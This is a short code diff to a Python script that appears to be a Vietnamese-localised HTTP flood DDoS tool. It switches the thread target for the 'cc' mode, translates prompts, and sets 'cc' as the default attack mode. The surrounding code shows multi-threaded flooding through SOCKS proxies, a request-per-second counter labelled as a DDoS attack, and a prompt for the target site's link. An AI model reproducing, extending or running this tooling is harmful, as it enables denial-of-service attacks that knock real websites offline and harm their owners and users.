@@ -92,7 +92,7 @@ def build_threads(mode,thread_num,event,socks_type,ind_rlock):
 			th.start()
 	elif mode == "cc":
 		for _ in range(thread_num):
-			th = threading.Thread(target = dd,args=(event,socks_type,ind_rlock,))
+			th = threading.Thread(target = cc,args=(event,socks_type,ind_rlock,))
 			th.setDaemon(True)
 			th.start()
 	elif mode == "head":
@@ -287,7 +287,7 @@ def OutputToScreen(ind_rlock):
 			total = total + v
 			ind_dict[k] = 0
 		ind_rlock.release()
-		print("{:^70}".format(" ["+sp_char[i]+"] Tấn công DDoS Kiểu DD | Tổng Rps: "+str(total)))
+		print("{:^70}".format(" ["+sp_char[i]+"] Tấn công DDoS Kiểu CC | Tổng Rps: "+str(total)))
 		i+=1
 		time.sleep(1)
 		print("\n"*100)
@@ -646,8 +646,8 @@ def main():
 	global cookies
 	global brute
 	global url
-	print("> Mode: [cc/post/head/slow/check]")
-	mode = InputOption("> Chọn chế độ (mặc định = dd): ",["cc","post","head","slow","check"],"cc")
+	print("> Chế độ: [cc/post/head/slow/check]")
+	mode = InputOption("> Chọn chế độ (mặc định = cc): ",["cc","post","head","slow","check"],"cc")
 	url = str(input("> Nhập link tới trang mục tiêu: ")).strip()
 	prevent()
 	ParseUrl(url)
